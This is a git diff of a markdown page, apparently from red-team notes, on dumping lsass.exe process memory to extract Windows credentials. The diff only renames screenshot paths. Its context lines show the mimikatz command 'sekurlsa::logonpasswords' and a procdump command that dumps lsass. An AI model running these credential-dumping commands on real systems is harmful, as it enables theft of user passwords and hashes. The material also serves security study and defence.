@@ -12,9 +12,9 @@ See my notes about writing a simple custom process dumper using `MiniDumpWriteDu
 
 Create a minidump of the lsass.exe using task manager (must be running as administrator):
 
-![](../../.gitbook/assets/screenshot-from-2019-03-12-19-55-27.png)
+![](<../../.gitbook/assets/Screenshot from 2019-03-12 19-55-27.png>)
 
-![](../../.gitbook/assets/screenshot-from-2019-03-12-19-56-12.png)
+![](<../../.gitbook/assets/Screenshot from 2019-03-12 19-56-12.png>)
 
 Swtich mimikatz context to the minidump:
 
@@ -25,7 +25,7 @@ sekurlsa::logonpasswords
 ```
 {% endcode %}
 
-![](../../.gitbook/assets/screenshot-from-2019-03-12-19-54-15.png)
+![](<../../.gitbook/assets/Screenshot from 2019-03-12 19-54-15.png>)
 
 ## Procdump
 
@@ -40,9 +40,9 @@ procdump.exe -accepteula -r -ma lsass.exe lsass.dmp
 ```
 {% endcode %}
 
-![](../../.gitbook/assets/screenshot-from-2019-03-12-20-11-28.png)
+![](<../../.gitbook/assets/Screenshot from 2019-03-12 20-11-28.png>)
 
-![](../../.gitbook/assets/screenshot-from-2019-03-12-20-13-25.png)
+![](<../../.gitbook/assets/Screenshot from 2019-03-12 20-13-25.png>)
 
 ## comsvcs.dll
 
